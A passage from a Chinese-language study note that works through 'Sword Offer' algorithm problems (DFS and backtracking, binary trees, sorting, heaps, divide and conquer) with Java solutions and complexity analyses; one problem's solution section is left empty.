`Arrays.asList` 将数组转化成List集合\n- `Collections.reverse `反转列表元素\n- `String.join` 用给定的定界符连接数组或列表中所有元素\n- “`\\s+`”则表示匹配任意多个空白字符。另因为反斜杠在Java里是转义字符，所以在Java里，我们要这么用“`\\\\s+`”\n\n#### 方法2：**双指针**\n\n##### 算法解析：\n\n-   倒序遍历字符串 s ，记录单词左右索引边界 i , j ；\n-   每确定一个单词的边界，则将其添加至单词列表 res ；\n-   最终，将单词列表拼接为字符串，并返回即可。\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        s = s.trim(); // 删除首尾空格\n        int j = s.length() - 1, i = j;\n        StringBuilder res = new StringBuilder();\n        while(i >= 0) {\n            while(i >= 0 && s.charAt(i) != ' ') i--; // 搜索首个空格\n            res.append(s.substring(i + 1, j + 1) + \" \"); // 添加单词\n            while(i >= 0 && s.charAt(i) == ' ') i--; // 跳过单词间空格\n            j = i; // j 指向下个单词的尾字符\n        }\n        return res.toString().trim(); // 转化为字符串，删除尾部空格，并返回\n    }\n}\n```\n\n### 复杂度\n\n#### 方法1\n\n-   **时间复杂度O(N)**：其中 N 为字符串 s 的长度。\n    \n-   **空间复杂度O(N)**：用来存储字符串分割之后的结果。\n\n#### 方法2\n\n-   **时间复杂度 O(N)：** 其中 N 为字符串 s 的长度，线性遍历字符串。\n-   **空间复杂度 O(N) ：** 新建的 StringBuilder(Java) 中的字符串总长度 ≤N，占用 O(N) 大小的额外空间。\n\n# 第 14 天 搜索与回溯算法（中等） \n\n## 12. 矩阵中的路径\n\n### 题目\n\n>给定一个 m x n 二维字符网格 board 和一个字符串单词 word 。如果 word 存在于网格中，返回 true ；否则，返回 false 。\n>\n>单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。\n>\n>例如，在下面的 3×4 的矩阵中包含单词 \"ABCCED\"（单词中的字母已标出）。\n>\n>![](https://img.jwt1399.top/img/202208211450131.jpg)\n>\n>示例 1：\n>\n>```\n>输入：board = [[\"A\",\"B\",\"C\",\"E\"],[\"S\",\"F\",\"C\",\"S\"],[\"A\",\"D\",\"E\",\"E\"]], word = \"ABCCED\"\n>输出：true\n>```\n>\n>示例 2：\n>\n>```\n>输入：board = [[\"a\",\"b\"],[\"c\",\"d\"]], word = \"abcd\"\n>输出：false\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208301121232.png)\n\n##### DFS 解析：\n\n-   **递归参数：** 当前元素在矩阵 `board` 中的行列索引 `i` 和 `j` ，当前目标字符在 `word` 中的索引 `k` \n-   **终止条件：**\n    1.  返回 false ： (1) 行或列索引越界 **或** (2) 当前矩阵元素与目标字符不同 **或** (3) 当前矩阵元素已访问过 （ (3) 可合并至 (2) ） 。\n    2.  返回 true ： `k = len(word) - 1` ，即字符串 `word` 已全部匹配。\n-   **递推工作：**\n    1.  标记当前矩阵元素： 将 `board[i][j]` 修改为 **空字符** `''` ，代表此元素已访问过，防止之后搜索时重复访问。\n    2.  搜索下一单元格： 朝当前元素的 **上、下、左、右** 四个方向开启下层递归，使用 `或` 连接 （代表只需找到一条可行路径就直接返回，不再做后续 DFS ），并记录结果至 `res` 。\n    3.  还原当前矩阵元素： 将 `board[i][j]` 元素还原至初始值，即 `word[k]` 。\n-   **返回值：** 返回布尔量 `res` ，代表是否搜索到目标字符串\n\n```java\nclass Solution {\n    public boolean exist(char[][] board, String word) {\n        char[] words = word.toCharArray();\n        for(int i = 0; i < board.length; i++) {\n            for(int j = 0; j < board[0].length; j++) {\n                if(dfs(board, words, i, j, 0)) return true;\n            }\n        }\n        return false;\n    }\n    boolean dfs(char[][] board, char[] word, int i, int j, int k) {\n        if(i >= board.length || i < 0 || j >= board[0].length || j < 0 || board[i][j] != word[k]) return false;\n        if(k == word.length - 1) return true;\n        board[i][j] = '\\0';\n        boolean res = dfs(board, word, i + 1, j, k + 1) || dfs(board, word, i - 1, j, k + 1) || \n                      dfs(board, word, i, j + 1, k + 1) || dfs(board, word, i , j - 1, k + 1);\n        board[i][j] = word[k];\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n> M,N 分别为矩阵行列大小， K 为字符串 `word` 长度。\n\n-   **时间复杂度 O(3<sup>K</sup>MN)：** 最差情况下，需要遍历矩阵中长度为 K 字符串的所有方案，时间复杂度为 O(3<sup>K</sup>)；矩阵中共有 MN 个起点，时间复杂度为 O(MN) 。\n    -   **方案数计算：** 设字符串长度为 K ，搜索中每个字符有上、下、左、右四个方向可以选择，舍弃回头（上个字符）的方向，剩下 3 种选择，因此方案数的复杂度为 O(3<sup>K</sup>) 。\n-   **空间复杂度 O(K) ：** 搜索过程中的递归深度不超过 K ，因此系统因函数调用累计使用的栈空间占用 O(K) （因为函数返回后，系统调用的栈空间会释放）。最坏情况下 K\\=MN，递归深度为 MN ，此时系统栈使用 O(MN) 的额外空间。\n\n## 13. 机器人的运动范围\n\n### 题目\n\n>地上有一个m行n列的方格，从坐标 [0,0] 到坐标 [m-1,n-1] 。一个机器人从坐标 [0, 0] 的格子开始移动，它每次可以向左、右、上、下移动一格（不能移动到方格外），也不能进入行坐标和列坐标的数位之和大于k的格子。例如，当k为18时，机器人能够进入方格 [35, 37] ，因为3+5+3+7=18。但它不能进入方格 [35, 38]，因为3+5+3+8=19。请问该机器人能够到达多少个格子？\n>\n>示例 1：\n>\n>```\n>输入：m = 2, n = 3, k = 1\n>输出：3\n>```\n>\n>示例 2：\n>\n>```\n>输入：m = 3, n = 1, k = 0\n>输出：1\n>```\n\n### 解答\n\n```java\nclass Solution {\n    public int movingCount(int m, int n, int k) {\n        // 记录位置是否被遍历过\n        boolean[][] visited = new boolean[m][n];\n        return dfs(visited, m, n, 0, 0, k);\n    }\n\n    private int dfs(boolean[][] visited, int m, int n, int i, int j, int k) {\n        // i >= m || j >= n是边界条件的判断\n        if (i >= m || j >= n\n                // visited[i][j]判断这个格子是否被访问过\n                || visited[i][j] == true\n                // 判断当前格子坐标是否满足条件\n                || bitSum(i) + bitSum(j) > k) {\n            return 0;\n        }\n        // 标注这个格子被访问过\n        visited[i][j] = true;\n        // 沿着当前格子的右边和下边继续访问\n        //代表从本单元格递归搜索的可达解总数。\n        return 1 + dfs(visited, m, n, i + 1, j, k) + dfs(visited, m, n, i, j + 1, k);\n    }\n    // 计算数位和\n    private int bitSum(int x) {\n        int sum = 0;\n        while(x > 0) {\n            sum += x % 10;\n            x /= 10; \n        }\n        return sum;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(MN) ：** 最差情况下，机器人遍历矩阵所有单元格，此时时间复杂度为 O(MN) 。\n-   **空间复杂度 O(MN)：** 最差情况下， `visited` 内存储矩阵所有单元格的索引，使用 O(MN) 的额外空间。\n\n# 第 15 天 搜索与回溯算法（中等）\n\n## 34. 二叉树中和为某一值的路径\n\n### 题目\n\n>给你二叉树的根节点 root 和一个整数目标和 targetSum ，找出所有 从根节点到叶子节点路径总和等于给定目标和的路径。\n>\n>叶子节点 是指没有子节点的节点。\n>\n>示例 1：\n>\n>![](https://img.jwt1399.top/img/202208232302265.jpg)\n>\n>```\n>输入：root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22\n>输出：[[5,4,11,2],[5,8,4,5]]\n>```\n>\n>示例 2：\n>\n>![](https://img.jwt1399.top/img/202208232302516.jpg)\n>\n>```\n>输入：root = [1,2,3], targetSum = 5\n>输出：[]\n>```\n>\n>示例 3：\n>\n>```\n>输入：root = [1,2], targetSum = 0\n>输出：[]\n>```\n\n### 解答\n\n\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n    LinkedList<Integer> path = new LinkedList<>();\n  \tLinkedList<List<Integer>> res = new LinkedList<>();\n    public List<List<Integer>> pathSum(TreeNode root, int target) {\n\t\tdfs(root, target);\n      \treturn res;\n      \n    }\n    private void dfs(TreeNode root, int target){\n      if(root == null) return;\n      path.add(root.val);\n      target -= root.val;\n      if(target == 0 && root.left == null && root.right == null)\n             // 细节：为什么我要通过构造方法传入path，不能直接res.add(path)\n            //因为直接加入，加入的是引用(指向的堆中数据会变化)，需要克隆一份加入\n         res.add(new LinkedList(path));\n      dfs(root.left, target);\n      dfs(root.right, target);\n      path.removeLast();// 将本次搜索结果移除，方便其他搜索使用path变量\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** N 为二叉树的节点数，先序遍历需要遍历所有节点。\n-   **空间复杂度 O(N) ：** 最差情况下，即树退化为链表时，`path` 存储所有树节点，使用 O(N) 额外空间。\n\n## 36. 二叉搜索树与双向链表\n\n### 题目\n\n>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。\n>\n>为了让您更好地理解问题，以下面的二叉搜索树为例：\n>\n>![](https://img.jwt1399.top/img/202208240010290.png)\n>\n>我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。\n>\n>下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。\n>\n>![](https://img.jwt1399.top/img/202208240010148.png)\n>\n>特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。\n>\n\n###  解答\n\n将**二叉搜索树**转换成一个 “**排序的循环双向链表**” ，其中包含三个要素：\n\n1.  **排序链表：** 二叉搜索树的中序遍历为 **递增序列** 。\n2.  **双向链表：** 在构建相邻节点的引用关系时，设前驱节点 `pre` 和当前节点 `cur` ，不仅应构建 `pre.right = cur` ，也应构建 `cur.left = pre` 。\n3.  **循环链表：** 设链表头节点 `head` 和尾节点 `tail` ，则应构建 `head.left = tail` 和 `tail.right = head` 。\n\n![](https://img.jwt1399.top/img/202208241646204.png)\n\n```java\nclass Solution {\n    Node pre, head;\n    public Node treeToDoublyList(Node root) {\n        if(root == null) return null;\n        dfs(root);\n        head.left = pre;\n        pre.right = head;\n        return head;\n    }\n    void dfs(Node cur){\n      if(cur == null) return;\n      dfs(cur.left);\n      if(pre != null)\n        pre.right = cur;\n      else\n        head = cur;\n      cur.left = pre;\n      pre = cur;\n      dfs(cur.right);\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** N 为二叉树的节点数，中序遍历需要访问所有节点。\n-   **空间复杂度 O(N) ：** 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O(N) 栈空间。\n\n## 54.二叉搜索树的第k大节点\n\n### 题目\n\n>给定一棵二叉搜索树，请找出其中第 k 大的节点的值。\n>\n>示例 1:\n>\n>```\n>输入: root = [3,1,4,null,2], k = 1\n>   3\n>  / \\\n> 1   4\n>  \\\n>   2\n>输出: 4\n>```\n>\n>示例 2:\n>\n>```\n>输入: root = [5,3,6,2,4,null,null,1], k = 3\n>       5\n>      / \\\n>     3   6\n>    / \\\n>   2   4\n>  /\n> 1\n>输出: 4\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208241746296.png)\n\n```java\nclass Solution {\n    int count=0, res=0;//形参k不能随着dfs的迭代而不断变化，为了记录迭代进程和结果，引入类变量count和res。\n    public int kthLargest(TreeNode root, int k) {\n        this.count=k;//利用形参值k对类变量count进行初始化\n        dfs(root);//这里不要引入形参k，dfs中直接使用的是初始值为k的类变量count\n        return res;            \n    }\n    public void dfs(TreeNode root){ //中序遍历的倒序\n        if(root==null||count==0) return;//当root为空或者已经找到了res时，直接返回\n        dfs(root.right);\n        if(--count==0){//先--，再判断\n            res = root.val;\n            return;//这里的return可以避免之后的无效迭代dfs(root.left);\n        }\n        dfs(root.left);  \n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N)：** 当树退化为链表时（全部为右子节点），无论 k 的值大小，递归深度都为 N ，占用 O(N) 时间。\n-   **空间复杂度 O(N)：** 当树退化为链表时（全部为右子节点），系统使用 O(N) 大小的栈空间。\n\n# 第 16 天 排序（简单）\n\n## 45.把数组排成最小的数\n\n### 题目\n\n>输入一个非负整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。\n>\n>示例 1:\n>\n>```\n>输入: [10,2]\n>输出: \"102\"\n>```\n>\n>示例 2:\n>\n>```\n>输入: [3,30,34,5,9]\n>输出: \"3033459\"\n>```\n\n### 解答\n\n设数组 nums 中任意两数字的字符串为 x 和 y ，则规定 **排序判断规则** 为：\n\n-   若拼接字符串 xy > yx ，则 x 应在 y 右边 ；\n-   反之，若 xy < yx，则 x 应在 y 左边 ；\n\n```java\nclass Solution {\n    public String minNumber(int[] nums) {\n      String[] strs = new String[nums.length];\n      for(int i = 0; i < nums.length; i++){\n        strs[i] = String.valueOf(nums[i]);\n      }\n      Arrays.sort(strs, (x, y) -> (x + y).compareTo(y + x));\n      StringBuilder res = new StringBuilder();\n      for(String s : strs){\n        res.append(s);\n      }\n      return res.toString();\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(Nlog⁡N) ：**N 为最终返回值的字符数量；使用内置函数 Arrays.sort 的平均时间复杂度为 O(Nlog⁡N)，最差为 O(N<sup>2</sup>)。\n-   **空间复杂度 O(N) ：** 字符串列表 strs 占用线性大小的额外空间。\n\n## 61. 扑克牌中的顺子\n\n### 题目\n\n>从若干副扑克牌中随机抽 5 张牌，判断是不是一个顺子，即这5张牌是不是连续的。2～10为数字本身，A为1，J为11，Q为12，K为13，而大、小王为 0 ，可以看成任意数字。A 不能视为 14。\n>\n>示例 1:\n>\n>```\n>输入: [1,2,3,4,5]\n>输出: True\n>```\n>\n>\n>示例 2:\n>\n>```\n>输入: [0,0,1,2,5]\n>输出: True\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208271513742.png)\n\n- 遍历五张牌，遇到大小王（即 0 ）直接跳过。\n- 判别重复： 利用 Set 实现遍历判重， Set 的查找方法的时间复杂度为 O(1) ；\n- 获取最大 / 最小的牌： 借助辅助变量 max 和 min ，遍历统计即可。\n\n```java\nclass Solution {\n    public boolean isStraight(int[] nums) {\n      Set<Integer> set = new HashSet<>();\n      int max = 0, min = 14;\n      for(int num : nums){\n        if(num == 0) continue; // 跳过大小王\n        max = Math.max(max,num);// 最大牌\n        min = Math.min(min,num);// 最小牌\n        if(set.contains(num)) return false; // 若有重复，提前返回 false\n        set.add(num);// 添加此牌至 Set\n      }\n      return max - min < 5;// 最大牌 - 最小牌 < 5 则可构成顺子\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N)\\=O(5)\\=O(1)：** 其中 N 为 nums 长度，本题中 N≡5 ；遍历数组使用 O(N) 时间。\n-   **空间复杂度 O(N)\\=O(5)\\=O(1) ：** 用于判重的辅助 Set 使用 O(N) 额外空间。\n\n# 第 17 天 排序（中等）\n\n## 40. 最小的k个数\n\n### 题目\n\n>输入整数数组 arr ，找出其中最小的 k 个数。例如，输入4、5、1、6、2、7、3、8这8个数字，则最小的4个数字是1、2、3、4。\n>\n>示例 1：\n>\n>```\n>输入：arr = [3,2,1], k = 2\n>输出：[1,2] 或者 [2,1]\n>```\n>\n>示例 2：\n>\n>```\n>输入：arr = [0,1,2,1], k = 1\n>输出：[0]\n>```\n\n### 解答\n\n```java\nclass Solution {\n    public int[] getLeastNumbers(int[] arr, int k) {\n      int[] res = new int[k];\n      Arrays.sort(arr);\n      for(int i = 0; i < k; i++){\n        res[i] = arr[i];\n      }\n      return res;\n    }\n}\n\nclass Solution {\n    public int[] getLeastNumbers(int[] arr, int k) {\n        Arrays.sort(arr);\n        return Arrays.copyOf(arr, k);\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(Nlog⁡N) ：**N 为数组长度；使用内置函数 Arrays.sort 的平均时间复杂度为 O(Nlog⁡N)，最差为 O(N<sup>2</sup>)。\n-   **空间复杂度 O(N) ：** 数组占用线性大小的额外空间。\n\n## 41. 数据流中的中位数\n\n### 题目\n\n>如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。\n>\n>例如，\n>\n>[2,3,4] 的中位数是 3\n>\n>[2,3] 的中位数是 (2 + 3) / 2 = 2.5\n>\n>设计一个支持以下两种操作的数据结构：\n>\n>- void addNum(int num) - 从数据流中添加一个整数到数据结构中。\n>- double findMedian() - 返回目前所有元素的中位数。\n>\n>示例 1：\n>\n>```\n>输入：\n>[\"MedianFinder\",\"addNum\",\"addNum\",\"findMedian\",\"addNum\",\"findMedian\"]\n>[[],[1],[2],[],[3],[]]\n>输出：[null,null,null,1.50000,null,2.00000]\n>```\n>\n>示例 2：\n>\n>```\n>输入：\n>[\"MedianFinder\",\"addNum\",\"findMedian\",\"addNum\",\"findMedian\"]\n>[[],[2],[],[3],[]]\n>输出：[null,null,2.00000,null,2.50000]\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208281635614.png)\n\n```java\nclass MedianFinder {\n    Queue<Integer> A, B;\n    public MedianFinder() {\n        A = new PriorityQueue<>(); // 小顶堆，保存较大的一半\n        B = new PriorityQueue<>((x, y) -> (y - x)); // 大顶堆，保存较小的一半\n    }\n    public void addNum(int num) {\n        if(A.size() != B.size()) {\n            A.add(num);\n            B.add(A.poll());\n        } else {\n            B.add(num);\n            A.add(B.poll());\n        }\n    }\n    public double findMedian() {\n        return A.size() != B.size() ? A.peek() : (A.peek() + B.peek()) / 2.0;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度：**\n    -   **查找中位数 O(1) ：** 获取堆顶元素使用 O(1)时间；\n    -   **添加数字 O(log⁡N)：** 堆的插入和弹出操作使用 O(log⁡N) 时间。\n-   **空间复杂度 O(N) ：** 其中 N 为数据流中的元素数量，小顶堆 A 和大顶堆 B 最多同时保存 N 个元素。\n\n# 第 18 天 搜索与回溯算法（中等） \n\n## 55 - I. 二叉树的深度\n\n### 题目\n\n>输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。\n>\n>例如：\n>\n>给定二叉树 [3,9,20,null,null,15,7]，\n>\n>        3\n>       / \\\n>      9  20\n>        /  \\\n>       15   7\n>\n>返回它的最大深度 3 。\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208291551122.png)\n\n```java\nclass Solution {\n    public int maxDepth(TreeNode root) {\n        if(root == null) return 0;\n        return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** N 为树的节点数量，计算树的深度需要遍历所有节点。\n-   **空间复杂度 O(N)：** 最差情况下（当树退化为链表时），递归深度可达到 N 。\n\n## 55 - II. 平衡二叉树\n\n### 题目\n\n>输入一棵二叉树的根节点，判断该树是不是平衡二叉树。如果某二叉树中任意节点的左右子树的深度相差不超过1，那么它就是一棵平衡二叉树。\n>\n>示例 1:\n>\n>给定二叉树 [3,9,20,null,null,15,7]\n>\n>```\n>   3\n>  / \\\n> 9  20\n>   /  \\\n>  15   7\n>```\n>\n>返回 true 。\n>\n>示例 2:\n>\n>给定二叉树 [1,2,2,3,3,null,null,4,4]\n>\n>          1\n>         / \\\n>        2   2\n>       / \\\n>      3   3\n>     / \\\n>    4   4\n>返回 false 。\n\n### 解答\n\n```java\nclass Solution {\n    public boolean isBalanced(TreeNode root) {\n        if (root == null) return true;\n        return Math.abs(depth(root.left) - depth(root.right)) <= 1 && isBalanced(root.left) && isBalanced(root.right);\n    }\n\n    private int depth(TreeNode root) {\n        if (root == null) return 0;\n        return Math.max(depth(root.left), depth(root.right)) + 1;\n    }\n}\n```\n\n### 复杂度\n\n- **时间复杂度 O(NlogN)：**最差情况下（为 “满二叉树” 时），满二叉树高度的复杂度 O(logN)，各层执行 `depth(root)` 的时间复杂度为 O(N)，总体时间复杂度 == 每层执行复杂度 × 层数复杂度 = O(N×logN) 。\n\n- **空间复杂度 O(N)：** 最差情况下（树退化为链表时），系统递归需要使用 O(N) 的栈空间。\n\n# 第 19 天 搜索与回溯算法（中等）\n\n## 64. 求1+2+…+n\n\n### 题目\n\n>求 1+2+...+n ，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。\n>\n>示例 1：\n>\n>```\n>输入: n = 3\n>输出: 6\n>```\n>\n>示例 2：\n>\n>```\n>输入: n = 9\n>输出: 45\n>```\n\n### 解答\n\n1+2+...+(n−1)+n 的计算方法主要有三种：平均计算、迭代、递归。\n\n- 平均计算：(1 + n) * n / 2；此计算必须使用 **乘除法** ，因此本方法不可取，直接排除。\n\n```java\npublic int sumNums(int n) {\n    return (1 + n) * n / 2;\n}\n```\n\n- 迭代：循环必须使用 while 或 for，因此本方法不可取，直接排除。\n\n```java\npublic int sumNums(int n) {\n    int res = 0;\n    for(int i = 1; i <= n; i++)\n        res += i;\n    return res;\n}\n```\n\n- 递归：终止条件需要使用 if ，因此本方法不可取。\n\n```java\npublic int sumNums(int n) {\n    if(n == 0) return 0;\n    n += sumNums(n - 1);\n    return n;\n}\n```\n\n- 正确解答：使用逻辑运算符的短路效应来终止递归\n\n常见的逻辑运算符有三种，即 “与 && ”，“或 || ”，“非 ! ” ；而其有重要的短路效应\n\n```java\nif(A && B)  // 若 A 为 false ，则 B 的判断不会执行（即短路），直接判定 A && B 为 false\n\nif(A || B) // 若 A 为 true ，则 B 的判断不会执行（即短路），直接判定 A || B 为 true\n```\n\n本题需要实现 “当 n\\=1 时终止递归” 的需求，可通过短路效应实现。\n\n```java\nn > 0 && n += sumNums(n - 1) // 当 n = 0 时 n > 0 不成立 ，此时 “短路” ，终止后续递归\n```\n\n```java\nclass Solution {\n    public int sumNums(int n) {\n        boolean flag = n > 0 && (n += sumNums(n - 1)) > 0;\n        return n;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(n) ：** 计算 n+(n−1)+...+2+1 需要开启 n 个递归函数。\n-   **空间复杂度 O(n) ：** 递归深度达到 n ，系统使用 O(n) 大小的额外空间。\n\n## 68 - I. 二叉搜索树的最近公共祖先\n\n### 题目\n\n>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。\n>\n>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”\n>\n>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]\n>\n>![](https://img.jwt1399.top/img/202208301248898.png)\n>\n>示例 1:\n>\n>```\n>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8\n>输出: 6 \n>解释: 节点 2 和节点 8 的最近公共祖先是 6。\n>```\n>\n>示例 2:\n>\n>```\n>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4\n>输出: 2\n>解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。\n>```\n\n### 解答\n\n#### 方法1：迭代\n\n**最近公共祖先的定义：** 设节点 root 为节点 p,q 的某公共祖先，若其左子节点 root.left 和右子节点 root.right 都不是 p,q 的公共祖先，则称 root 是 “最近的公共祖先” 。\n\n-   **循环搜索：** 当节点 root 为空时跳出；\n    1.  当 p,q 都在 root 的 **右子树** 中，则遍历至 root.right ；\n    2.  否则，当 p,q 都在 root 的 **左子树** 中，则遍历至 root.left ；\n    3.  否则，说明找到了 **最近公共祖先** ，跳出。\n-   **返回值：** 最近公共祖先 root 。\n\n本题给定了两个重要条件：① 树为 **二叉搜索树** ，② 树的所有节点的值都是 **唯一** 的。根据以上条件，可方便地判断 p,q 与 root 的子树关系，即：\n\n-   若 root.val<p.val ，则 p 在 root **右子树** 中；\n-   若 root.val\\>p.val ，则 p 在 root **左子树** 中；\n-   若 root.val\\=p.val ，则 p 和 root 指向 **同一节点** \n\n```java\nclass Solution {\n    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n        while(root != null) {\n            if(root.val < p.val && root.val < q.val) // p,q 都在 root 的右子树中\n                root = root.right; // 遍历至右子节点\n            else if(root.val > p.val && root.val > q.val) // p,q 都在 root 的左子树中\n                root = root.left; // 遍历至左子节点\n            else break;\n        }\n        return root;\n    }\n}\n```\n\n#### 方法2：递归\n\n```java\nclass Solution {\n    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n        if(root.val < p.val && root.val < q.val)\n            return lowestCommonAncestor(root.right, p, q);\n        if(root.val > p.val && root.val > q.val)\n            return lowestCommonAncestor(root.left, p, q);\n        return root;\n    }\n}\n```\n\n### 复杂度\n\n#### 方法1\n\n-   **时间复杂度 O(N)：** 其中 N 为二叉树节点数；每循环一轮排除一层，二叉搜索树的层数最小为 log⁡N （满二叉树），最大为 N （退化为链表）。\n-   **空间复杂度 O(1)：** 使用常数大小的额外空间。\n\n#### 方法2\n\n-   **时间复杂度 O(N)：** 其中 N 为二叉树节点数；每循环一轮排除一层，二叉搜索树的层数最小为 log⁡N （满二叉树），最大为 N （退化为链表）。\n-   **空间复杂度 O(N)：** 最差情况下，即树退化为链表时，递归深度达到树的层数 N 。\n\n## 68 - II. 二叉树的最近公共祖先\n\n### 题目\n\n>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。\n>\n>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”\n>\n>例如，给定如下二叉树:  root = [3,5,1,6,2,0,8,null,null,7,4]\n>\n>![](https://img.jwt1399.top/img/202208301726689.png)\n>\n>示例 1:\n>\n>```\n>输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1\n>输出: 3\n>解释: 节点 5 和节点 1 的最近公共祖先是节点 3。\n>```\n>\n>示例 2:\n>\n>```\n>输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4\n>输出: 5\n>解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。\n>```\n\n### 解答\n\n```java\n\n```\n\n### 复杂度\n\n# 第 20 天 分治算法（中等）\n\n## 07. 重建二叉树\n\n### 题目\n\n>输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。\n>\n>假设输入的前序遍历和中序遍历的结果中都不含重复的数字。\n>\n>示例 1:\n>\n>![](https://img.jwt1399.top/img/202208311403683.jpg)\n>\n>```\n>Input: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]\n>Output: [3,9,20,null,null,15,7]\n>```\n>\n>\n>示例 2:\n>\n>```\n>Input: preorder = [-1], inorder = [-1]\n>Output: [-1]\n>```\n\n### 解答\n\n前序遍历性质： 节点按照 `[ 根节点 | 左子树 | 右子树 ]` 排序。\n中序遍历性质： 节点按照 `[ 左子树 | 根节点 | 右子树 ]` 排序。\n\n![](https://img.jwt1399.top/img/202208311418630.png)\n\n**递推参数：** 根节点在前序遍历的索引 `pre_root` 、子树在中序遍历的左边界 `in_left` 、子树在中序遍历的右边界 `in_right` ；根节点在中序遍历 `inorder` 中的索引 `i` \n\n|            | 根节点索引                   | 中序遍历左边界 | 中序遍历右边界 |\n| ---------- | ---------------------------- | -------------- | -------------- |\n| **左子树** | `pre_root + 1`               | `in_left`      | `i - 1`        |\n| **右子树** | `pre_root + i - in_left + 1` | `i + 1`        | `in_right`     |\n\n> **TIPS：** `pre_root + i - in_left + 1`含义为 `根节点索引 + 左子树长度 + 1`\n\n```java\nclass Solution {\n    int[] preorder;//保留的先序遍历，方便递归时依据索引查看先序遍历的值\n    HashMap<Integer, Integer> dic = new HashMap<>();//存储中序遍历的值与索引\n    public TreeNode buildTree(int[] preorder, int[] inorder) {\n        this.preorder = preorder;\n        //将中序遍历的值及索引放在map中，方便递归时获取左子树与右子树的数量及其根的索引\n        for(int i = 0; i < inorder.length; i++)\n            dic.put(inorder[i], i);\n        return recur(0, 0, inorder.length - 1);//recur(当前根的的索引,子树左边界,子树右边界)\n    }\n    TreeNode recur(int pre_root, int in_left, int in_right) {\n        if(in_left > in_right) return null;                        // 递归终止\n        TreeNode root = new TreeNode(preorder[pre_root]);          // 建立根节点\n        int i = dic.get(preorder[pre_root]);                       // 划分根节点、左子树、右子树\n        //左子树的根的索引为先序中的根节点+1 \n        //左子树的左边界为原来的中序in_left\n        //左子树的右边界为中序中的根节点索引-1\n        root.left = recur(pre_root + 1, in_left, i - 1);           // 开启左子树递归\n        //右子树的根的索引为先序中的当前根位置 + 左子树的长度 + 1\n        //右子树的左边界为中序中当前根节点+1\n        //右子树的右边界为中序中原来右子树的边界\n        root.right = recur(pre_root + i - in_left + 1, i + 1, in_right); // 开启右子树递归\n        return root;                                           // 回溯返回根节点\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 其中 N 为树的节点数量。初始化 HashMap 需遍历 `inorder` ，占用 O(N)。递归共建立 N 个节点，每层递归中的节点建立、搜索操作占用 O(1)，因此使用 O(N)时间。\n-   **空间复杂度 O(N) ：** HashMap 使用 O(N) 额外空间；最差情况下（输入二叉树为链表时），递归深度达到 N ，占用 O(N) 的栈帧空间；因此总共使用 O(N) 空间。\n\n## 16. 数值的整数次方\n\n### 